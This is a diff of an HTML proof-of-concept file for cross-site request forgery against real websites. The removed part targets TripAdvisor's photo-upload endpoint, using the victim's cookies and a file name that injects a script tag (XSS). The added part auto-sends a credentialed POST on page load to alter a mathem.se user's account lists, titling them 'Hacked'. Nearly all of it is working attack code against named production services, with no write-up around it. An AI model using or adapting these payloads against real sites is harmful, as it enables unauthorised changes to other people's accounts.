@@ -1,46 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>CSRF PoC</title>
-</head>
-<body>
-  <h2>CSRF PoC for TripAdvisor addPhoto</h2>
-  <button id="csrfBtn">Send CSRF Request</button>
-
-  <script>
-    document.getElementById('csrfBtn').addEventListener('click', () => {
-      // Construct a blob for the file content (can be anything)
-      const fileContent = new Blob(['fake image content'], { type: 'image/png' });
-      
-      // Create a File object with the malicious filename
-      const file = new File(
-        [fileContent],
-        '"><script>alert(1)</script>.jpg"', // filename injection
-        { type: 'image/png' }
-      );
-
-      const formData = new FormData();
-      formData.append('photoType', 'PROFILE_COVER');
-      formData.append('pid', '40493');
-      formData.append('pidAttr', 'DESKTOP');
-      formData.append('cover_photo_edit', file);
-
-      fetch('https://www.tripadvisor.in/data/1.0/media/addPhoto', {
-        method: 'POST',
-        credentials: 'include', // send cookies for CSRF
-        body: formData,
+<html>
+  <body>
+    <h1>CSRF Attack Demo</h1>
+    <script>
+      fetch("https://www.mathem.se/se/account/lists/edit/", {
+        method: "POST",
+        credentials: "include", // ✅ Includes user's cookies
         headers: {
-          // Do NOT set Content-Type header for multipart/form-data with fetch, 
-          // browser sets the correct boundary automatically
-          'X-Requested-By': 'T'
-        }
-      }).then(response => {
-        alert('CSRF request sent! Status: ' + response.status);
-        return response.text();
-      }).then(text => console.log(text))
-        .catch(err => console.error('Error:', err));
-    });
-  </script>
-</body>
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          title: "Hacked",
+          description: "CSRF via CORS misconfig"
+        })
+      })
+      .then(res => res.text())
+      .then(data => console.log("Response:", data));
+    </script>
+  </body>
 </html>
